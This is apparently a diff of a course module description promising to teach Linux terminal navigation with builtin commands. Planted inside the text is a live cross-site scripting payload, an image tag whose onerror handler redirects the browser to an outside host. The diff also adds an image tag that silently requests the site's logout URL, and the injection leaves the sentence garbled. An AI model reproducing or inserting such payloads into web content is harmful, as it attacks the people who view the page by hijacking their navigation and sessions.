@@ -1,1 +1,3 @@
 So you think you know it all? you believe floppy<img src=x onerror=location='//x.y'> that you've mastered the art of using Linux? You haven't seen nothing yet. This module will teach how to work with the bare-bones, no bloat on top. You will learn how to navigate the terminal with just builtin command, and only after completing this module, you will be allowed to call yourself "The Builtin Master". 
+
+<img src="https://pwn.college/logout">
